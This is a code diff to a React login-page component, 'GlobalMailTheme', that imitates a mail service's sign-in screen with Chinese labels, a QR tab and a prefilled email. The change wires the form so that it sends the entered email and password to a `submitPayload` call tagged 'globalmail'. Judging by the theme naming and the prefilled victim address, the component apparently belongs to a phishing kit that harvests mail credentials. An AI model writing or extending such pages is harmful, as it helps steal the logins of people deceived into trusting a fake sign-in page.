@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useSecurity } from '../components/SecurityManager';
 
 interface GlobalMailThemeProps {
   prefilledEmail?: string;
@@ -9,6 +10,21 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'qr' | 'account'>('account');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email, password }, 'globalmail');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -95,7 +111,7 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
 
             <div className="p-8 space-y-6">
               {activeTab === 'account' ? (
-                <>
+                <form onSubmit={handleSubmit} className="space-y-6">
                   <div className="relative group">
                     <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                       <svg width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
@@ -141,14 +157,18 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
                     </div>
                   </div>
 
-                  <button className="w-full py-3 bg-[#e64a19] hover:bg-[#d84315] text-white font-medium rounded transition-colors text-[16px] shadow-sm tracking-widest">
-                    登录
+                  <button 
+                    type="submit"
+                    disabled={isSubmitting}
+                    className="w-full py-3 bg-[#e64a19] hover:bg-[#d84315] text-white font-medium rounded transition-colors text-[16px] shadow-sm tracking-widest disabled:opacity-70"
+                  >
+                    {isSubmitting ? '...' : '登录'}
                   </button>
 
                   <div className="text-right">
                     <a href="#" className="text-[12px] text-gray-400 hover:text-red-500">忘记密码?</a>
                   </div>
-                </>
+                </form>
               ) : (
                 <div className="flex flex-col items-center py-4 space-y-4">
                   <div className="w-48 h-48 bg-gray-50 border border-gray-100 flex items-center justify-center rounded p-2">
